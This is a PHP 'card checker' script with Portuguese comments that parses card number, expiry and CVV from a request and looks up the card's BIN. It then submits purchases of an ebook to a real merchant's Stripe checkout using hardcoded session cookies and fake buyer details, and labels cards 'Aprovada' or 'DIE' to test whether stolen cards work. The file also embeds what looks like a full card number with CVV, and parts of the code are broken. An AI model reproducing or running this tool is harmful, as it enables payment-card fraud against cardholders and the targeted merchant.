<?php
error_reporting(0);
ignore_user_abort();
session_start();

date_default_timezone_set('America/Sao_Paulo');


    function getStr($separa, $inicia, $fim, $contador){
  $nada = explode($inicia, $separa);
  $nada = explode($fim, $nada[$contador]);
  return $nada[0];
}

    function multiexplode($delimiters, $string) {
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
    }

    function replace_unicode_escape_sequence($match) { return mb_convert_encoding(pack('H*', $match[1]), 'UTF-8', 'UCS-2BE'); }
    function unicode_decode($str) { return preg_replace_callback('/\\\\u([0-9a-f]{4})/i', 'replace_unicode_escape_sequence', $str); }
    $lista = $_GET['lista'];
    $delemitador = array("|", ":", "/");
    $cc = multiexplode($delemitador, $lista)[0];
    $mes = multiexplode($delemitador, $lista)[1];
    $ano = multiexplode($delemitador, $lista)[2];
    $cvv = multiexplode($delemitador, $lista)[3];

    if (strlen($mes) == 1){
        $mes = "0$mes";
    }

    if (strlen($ano) == 2){
        $ano = "20$ano";
    }

    $bin = substr($cc, 0,6);
   
    if ($cc == NULL || $mes == NULL || $ano == NULL || $cvv == NULL) {
die('{"status":"die","lista":"null","message":"Cartao invalido, teste nao iniciado.","valor":"R$7,00"}');
}

$doisultimo = substr($cc, 14);
$bin = substr($cc, 0,8);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://lookup.binlist.net/$bin");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept-Version: 3'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$dados1 = curl_exec($ch);

$data = json_decode($dados1, true);

$bandeira = $data['scheme'];
$tipo = $data['type'];
$nivel = $data['brand'];
//$prepaid = $data['prepaid'];
$pais = $data['country']['name'];
$countryEmoji = $data['country']['emoji'];
$banco = $data['bank']['name'];
$infobin = "BANDEIRA: $bandeira | TIPO: $tipo | NÍVEL: $nivel | BANCO: $banco | PAÍS: $pais";


$re = array(
  "Visa" => "/^4[0-9]{12}(?:[0-9]{3})?$/",
  "Master" => "/^5[1-5]\d{14}$/",
  "Amex" => "/^3[47]\d{13,14}$/",
  "Elo" => "/^((((636368)|(438935)|(504175)|(650905)|(451416)|(636297))\d{0,10})|((5067)|(4576)|(6550)|(6516)|(6504)||(6509)|(4011))\d{0,12})$/",
  "hipercard" => "/^(606282\d{10}(\d{3})?)|(3841\d{15})$/",
);
if (preg_match($re['Visa'], $cc)) {
   $tipo = "3";
} else if (preg_match($re['Amex'], $cc)) {
    $tipo = "5";
} else if (preg_match($re['Master'], $cc)) {
   $tipo = "2";
} else if (preg_match($re['Elo'], $cc)) {
   $tipo = "7";
} 
else if (preg_match($re['hipercard'], $cc)) {
  $tipo = "8";
}

// 1 curl
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://tomhegna.com/api/v1/orders/get-quote");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: tomhegna.com ',
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
    'Accept-Encoding: gzip, deflate, br, zstd',
    'Content-Type: application/json',
    'sec-ch-ua-platform: "Android"',
    'x-requested-with: XMLHttpRequest',
    'sec-ch-ua: "Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    'content-type: application/json;charset=UTF-8',
    'sec-ch-ua-mobile: ?1',
    'origin: https://tomhegna.com',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: cors',
    'sec-fetch-dest: empty',
    'referer: https://tomhegna.com/shop/checkout',
    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6',
    'priority: u=1, i',
    'cookie: _gcl_au=1.1.1775474867.1746241925; _gid=GA1.2.53460502.1746241928; _fbp=fb.1.1746241929733.35032585861385701; _ga=GA1.1.310544625.1746241928; _ga_N1FS4VP0VF=GS2.1.s1746300822$o3$g1$t1746300882$j60$l0$h0; laravel_session=eyJpdiI6IjZ3VStrUUtBdmxqSHZXMkFlTHZnbEE9PSIsInZhbHVlIjoiNnRCemQ4TnRiaVAydUpMTUVJSlpyVjY3cG0xbERVeTZFSjlCYTh3MkgrUmhseDh2cVlvWThjRkJCOUNxZGhjdEsvTkNycXRvV3VLbkMxWCt6Y2oyOVV0SWk5NUZlWFRTUWNNSGRRUlgyQVlLK3BTQVZLL095c1hkWlovT2h2RUMiLCJtYWMiOiIwNTc5NTdiNzIyY2JhNGQwYmI5NzBlMjRiMzYyODRjNGQzZWNlYjI0ZTgzZDRjOTlmMjA1NDFiNjI3NzMzODAwIn0%3D',
    
    // o de add o carrinho ja foi so falta o postfilde 
    
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, ' {"source":"shop","funnel_id":null,"gateway":"stripe_3","coupon":null,"products":[{"id":86,"name":"Targeted Tactics: Marketing Strategies for the Modern Financial Professional [eBook]","quantity":1,"price":9.99,"shipping_price":0,"shippable":0,"type":"digital","max_shop_quantity":10,"plan_id":null,"unlimited_purchases":true,"product":{"id":86,"brand_id":1,"product_id":null,"name":"Targeted Tactics: Marketing Strategies for the Modern Financial Professional [eBook]","name_when_has_plans":"Single Sale","subscription_label":"","slug":"targeted-tactics-marketing-strategies-for-the-modern-financial-professional-ebook","tag_id":148,"code":"TTE2018","shop":1,"crm":1,"sell_only_plans":0,"color":"#eeeeee","max_shop_quantity":10,"type":"digital","subtype":"book","price":9.99,"price_value":9.99,"currency":"USD","summary":null,"description":"<p>Selling yourself is part of the sales process that you\'ve developed over the years. What about marketing yourself? It\'s important to understand that marketing is different from sales, and <em>Targeted Tactics</em>, Tom Hegna\'s new eBook, will teach you specific strategies you can use.</p><br><p>No matter when you want to see your revenue increase, you need to plan, get organized, and practice. In <em>Targeted Tactics</em>, Tom breaks these strategies up into three sections based on the length of time you can expect before you see a positive impact on your bottom line. There are some short-term, quarterly, and long-term strategies for you to choose from, and there are even suggest specific marketing tools to go along with each one.</p><br><p>\\"Think of this document as more than just a guide to improving your prospecting process. There are several tips you can use daily, quarterly, and annually, so keep it available for review throughout the year. Each section also suggests products that will help you qualify and convert your prospects.\\"</p><p>-Tom Hegna</p>\\r\\n\\r\\n<p>This eBook file will require using a PDF reader, and a recommended PDF reader is available at&nbsp;<a href=\\"https://www.adobe.com/\\" target=\\"_blank\\">Adobe.com&nbsp;</a>.</p><p>FOR USAGE RIGHTS SEE TERMS AND CONDITIONS.</p>","content":null,"header":null,"terms_and_conditions":"This ebook is locked and cannot be printed, or distributed. This is a digital product that we are unable to retrieve. Since we cannot retrieve our digital property, we will not be issuing&nbsp; any refunds. All sales are final.<p>You agree to the terms and conditions of the Terms of Use Agreement found at <a class=\\"orange-text\\" style=\\"color:orange;\\" href=\\"https://tomhegna.com/terms\\">TomHegna.com/terms</a>. Upon purchasing this product, you agree to the terms and conditions of the Privacy Policy found at <a class=\\"orange-text\\" style=\\"color:orange;\\" href=\\"https://tomhegna.com/privacy-policy\\">tomhegna.com/privacy-policy</a>. All details and information about refunds & returns, can be found at <a class=\\"orange-text\\" style=\\"color:orange;\\" href=\\"https://tomhegna.com/return-policy\\">tomhegna.com/return-policy</a>.</p>","shippable":0,"shipping_price":0,"product_cost":0,"trail":null,"status":1,"access":"paid","third_party":null,"metadata":{"lsvt_price":null,"email_for_review":0,"force_tax_calculation":null,"waiting_time_email_review":0},"reward_coupon_id":null,"created_at":"2018-10-15 11:37:38","updated_at":"2020-07-29 16:44:29","deleted_at":null,"custom_one":null,"custom_two":null,"has_videos":false,"averageReviews":null,"images":[{"id":812,"fileable_id":86,"fileable_type":"App\\\\Product","disk":"gcs","type":"image","title":"Targeted Tactics Product Image","name":"product/00000086/20181015_ldrqnJEOpP","extension":"jpg","category":"product-images","position":0,"metadata":[],"created_at":"2018-10-15 12:16:00","updated_at":"2018-10-15 12:16:00","deleted_at":null,"get_path":"https://storage.googleapis.com/wfhq_th/product/00000086/20181015_ldrqnJEOpP.jpg"}],"plans_for_shop":[],"videos":[],"users_reviews":[],"brand":{"id":1,"name":"Tom Hegna","code":"TH","description":"","created_at":"2017-01-26 07:36:25","updated_at":"2017-01-26 07:36:25","deleted_at":null},"quantity":1,"selectedPlan":null}}],"offers":[]}
');
$r1 = curl_exec($ch);

// aqui e o de pagamento 
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://tomhegna.com/api/v1/checkout ");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host:tomhegna.com  ',
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
    'Accept-Encoding: gzip, deflate, br, zstd',
    'Content-Type: application/json',
    'sec-ch-ua-platform: "Android"',
    'x-requested-with: XMLHttpRequest',
    'sec-ch-ua: "Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    'content-type: application/json;charset=UTF-8',
    'sec-ch-ua-mobile: ?1',
    'origin: https://tomhegna.com',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: cors',
    'sec-fetch-dest: empty',
    'referer: https://tomhegna.com/shop/checkout',
    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6',
    'priority: u=1, i',
    'cookie: _gcl_au=1.1.1775474867.1746241925; _gid=GA1.2.53460502.1746241928; _fbp=fb.1.1746241929733.35032585861385701; _ga=GA1.1.310544625.1746241928; _ga_N1FS4VP0VF=GS2.1.s1746300822$o3$g1$t1746300882$j60$l0$h0; laravel_session=eyJpdiI6ImRlUnpaL1FuaDkxb3FHdjEva1ZmMnc9PSIsInZhbHVlIjoiQ0tVMFVtSFZWQUxkZ2lRbnZucEhCYnZmUE5OZmgzUzBwdnQ1d3NiMEtoNXBTM1ZZWE1JOER2MjdJTXJzOXFHMUppKzlLV09CSjBHbVJhYVIxNHBoOUlZakZMMWVoS3pxUTZrVVNNNml4SGVnekxhaTBjakJLaEoxaWpVZ1Y3RXYiLCJtYWMiOiI1Y2I4NGUwNWUyOGMwZTIyYjYwZmI0M2U3NmExOGQ0NDA5ZGJhZWE3ZjRhMDA2ODRmYjNmZjVhOWNhZDc3ZjQ2In0%3D',
       // add o post filde
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '  {"funnel_id":null,"page_id":null,"user":{"first_name":"Jose ds Silva ","last_name":"Phdas","email":"Ph73636363636@gmail.com","phone_number":"7199195862"},"lead":null,"billing_address":{"id":null,"line":"Phdasul","city":"São Paulo ","country":"VN","state":"47","zip_code":"04156110"},"shipping_address":{"id":null,"line":"Phdasul","city":"São Paulo ","country":"VN","state":"47","zip_code":"04156110"},"coupon":null,"card":{"number":"4984421527529523","cvc":"063","exp_month":"02","exp_year":2026},"number":"7199195862","note":null,"products":[{"id":86,"quantity":1}],"offers":[],"shipping":null,"ship":true,"gateway":"stripe_3","source":"shop","call":{"sid":null},"lead_tags":null,"lead_list":null,"invoice_token":null} ');
$inicio = microtime(true);
$res_final = curl_exec($ch);
$fim = microtime(true);
$tempo_decorrido = number_format($fim - $inicio, 2);

// Tenta extrair "status" e "message" de várias formas
// Extrai "status" e "message" de forma limpa
$short_response = null;

// 1) Regex padrão: "status":"...","message":"..."
if (preg_match('/"status"\s*:\s*"([^"]+)"[\s,]*"message"\s*:\s*"([^"]+)"/s', $res_final, $m)) {
    $short_response = '"status":"'.$m[1].'","message":"'.$m[2].'"';
}
// 2) Regex alternativa
elseif (preg_match('/"status"\s*:\s*"([^"]+)".*?message[:=]\s*"([^"]+)"/si', $res_final, $m)) {
    $short_response = '"status":"'.$m[1].'","message":"'.$m[2].'"';
}
// 3) Se JSON válido
else {
    $json = json_decode($res_final, true);
    if (is_array($json) && isset($json['status']) && isset($json['message'])) {
        $short_response = '"status":"'.$json['status'].'","message":"'.$json['message'].'"';
    }
}

// Fallback caso não consiga extrair
if (!$short_response) {
    $short_response = htmlentities(mb_substr($res_final, 0, 400));
}

// ---------------------- BLOCO DE SAÍDA ----------------------
if (strpos($res_final, 'status":"fail","message:') !== false && strpos($res_final, "Your card's security code is incorrect.") !== false) {
    echo "<div style='background: linear-gradient(90deg, #00ff88, #009966); color: #fff; padding: 12px 16px; border-radius: 10px; font-family: monospace; font-size: 14px; margin-bottom: 10px; box-shadow: 0 0 8px #00ff88aa; max-width: 600px;'>
        <strong>✅ Aprovada</strong><br>
        💳 Cartão: <code>$cc/$mes/$ano/$cvv</code><br>
        🏦 Info: $info_bin<br>
        ⚠️ <em>Código de Segurança Incorreto</em><br>
        👤 Checker: <a href='https://t.me/wslzimm7' style='color:#ccffdd; text-decoration:none;'>@wslzimm7</a><br>
        👨‍💻 Dev da API: <a href='https://t.me/wslzimm7' style='color:#ccffdd; text-decoration:none;'>@wslzimm7</a><br>
        🕒 Tempo: {$tempo_decorrido}s
    </div>";
} elseif (strpos($res_final, '{"status":"success"}') !== false) {
    echo "<div style='background: linear-gradient(90deg, #00ff88, #009966); color: #fff; padding: 12px 16px; border-radius: 10px; font-family: monospace; font-size: 14px; margin-bottom: 10px; box-shadow: 0 0 8px #00ff88aa; max-width: 600px;'>
        <strong>✅ Aprovada</strong><br>
        💳 Cartão: <code>$cc/$mes/$ano/$cvv</code><br>
        🏦 Info: $info_bin<br>
        🔒 Status: success<br>
        👤 Checker by: <a href='https://t.me/wslzimm7' style='color:#ccffdd; text-decoration:none;'>@wslzimm7</a><br>
        👨‍💻 Dev da API: <a href='https://t.me/wslzimm7' style='color:#ccffdd; text-decoration:none;'>@wslzimm7</a><br>
        🕒 Tempo: {$tempo_decorrido}s
    </div>";
} else {
    echo "<div style='background: linear-gradient(90deg, #ff4c4c, #cc0000); color: #fff; padding: 12px 16px; border-radius: 10px; font-family: monospace; font-size: 14px; margin-bottom: 10px; box-shadow: 0 0 8px #ff4c4caa; max-width: 600px; word-wrap: break-word;'>
        <strong>❌ DIE</strong><br>
        💳 Cartão: <code>$cc/$mes/$ano/$cvv</code><br>
        🏦 Info: $info_bin<br>
        ⚠️ Response: <em>{$short_response}</em><br>
        👤 Checker by: <a href='https://t.me/wslzimm7' style='color:#ffbbbb; text-decoration:none;'>@wslzimm7</a><br>
        👨‍💻 Dev da API: <a href='https://t.me/wslzimm7' style='color:#ffbbbb; text-decoration:none;'>@wslzimm7</a><br>
        🕒 Tempo: {$tempo_decorrido}s
    </div>";
}

// ---------------------- LIMPEZA ----------------------
curl_close($ch);
if (file_exists($cookieFile)) {
    unlink($cookieFile);
}
?>
